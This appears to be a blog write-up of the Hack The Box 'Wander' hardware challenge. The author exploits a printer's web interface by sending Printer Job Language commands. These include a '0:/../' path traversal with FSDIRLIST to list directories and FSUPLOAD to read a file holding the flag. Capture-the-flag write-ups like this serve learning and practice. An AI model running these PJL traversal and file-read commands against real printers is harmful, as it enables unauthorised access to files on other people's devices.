---
layout: newpost
title: "Writeup: HTB Challenge Wander"
date: 2025-01-27
categories: [tech]
tags: [htb, ctf, hardware]
---

- Challenge: [Wander](https://app.hackthebox.com/challenges/Wander)
- Category: Hardware
- Solve date: 2025-01-27

---
### Description

> My uncle isn't allowing me to print documents. He's off to vacation and I need a PIN to unlock this printer. All I found is a web server where this printer is managed from. Can you help me with this situation ?

### Provided files

- n/a

---
# Web server recon

Visiting the provided URL, there is one input which mentions  "@JPL INFO ID". This make us realize that we are dealing with "Printer Job Language", and that we can probably just type any PJL command into the input.

---
# PJL

The [Printer Exploitation Toolkit](https://github.com/RUB-NDS/PRET/blob/master/pjl.py#L237) can help us find some relevant commands to use:
- `@PJL FSUPLOAD` : get file (I know, right..)
- `@PJL INFO` : display info
- `@PJL FSQUERY` : list files and directories

## Exploit

### Validate 

`@PJL INFO STATUS`: 
```html
@PJL INFO STATUS<br />CODE=10001<br />DISPLAY="Ready"<br />ONLINE=True
```

### List files

`@PJL FSDIRLIST NAME="0:/../" ENTRY=1 COUNT=65535`:
```sh
etc TYPE=DIR  
conf TYPE=DIR  
home TYPE=DIR  
rw TYPE=DIR  
tmp TYPE=DIR  
csr_misc TYPE=DIR  
printer TYPE=DIR
```

We'll use this pattern to find interesting files like `/home/default/readyjob`

Get file size with:
`@PJL FSDIRLIST NAME="0:/../home/default/readyjob" ENTRY=1 COUNT=65535`

### Print the file

`@PJL FSUPLOAD NAME = 0:/../home/default/readyjob" SIZE=457 OFFSET=0`

![flag](/assets/ctf_files/htb_wander/flag.png)

:checkered_flag:
